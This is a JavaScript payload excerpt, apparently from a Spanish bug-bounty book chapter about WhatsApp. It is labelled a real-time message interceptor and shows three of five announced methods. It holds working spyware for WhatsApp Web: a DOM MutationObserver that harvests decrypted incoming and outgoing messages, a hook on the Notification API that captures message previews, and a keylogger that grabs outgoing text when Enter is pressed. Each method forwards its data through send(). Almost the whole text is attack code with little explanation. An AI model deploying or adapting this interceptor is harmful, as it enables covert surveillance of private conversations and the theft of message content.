// Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
// spy_payload.js -- Interceptor de mensajes en tiempo real
// 5 metodos complementarios para maxima cobertura

// METODO 1: MutationObserver en el DOM
// Los mensajes descifrados se renderizan como nodos <span>
new MutationObserver(function(muts) {
    for (var m of muts) {
        for (var node of m.addedNodes) {
            if (node.nodeType !== 1) continue;
            var els = node.querySelectorAll
                ? node.querySelectorAll('[data-pre-plain-text]')
                : [];
            for (var el of els) {
                var txt = el.querySelector(
                    '[class*="selectable-text"] span');
                if (txt && txt.innerText) {
                    send({
                        type: 'MSG',
                        text: txt.innerText,
                        meta: el.getAttribute('data-pre-plain-text'),
                        dir: el.className.indexOf('message-out')
                            > -1 ? 'OUT' : 'IN'
                    });
                }
            }
        }
    }
}).observe(document.getElementById('app'), {
    childList: true, subtree: true
});

// METODO 2: Hook de Notification API
// Captura previsualizaciones de mensajes nuevos
var Orig = window.Notification;
window.Notification = function(title, opts) {
    send({type:'NOTIF', title:title,
          body: opts ? opts.body : ''});
    return new Orig(title, opts);
};

// METODO 3: Keylogger de mensajes salientes
// Captura el contenido del campo de texto al pulsar Enter
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && !e.shiftKey) {
        var input = document.querySelector(
            '[contenteditable="true"][data-tab]');
        if (input && input.innerText) {
            send({type:'TYPED', text: input.innerText});
        }
    }
}, true);
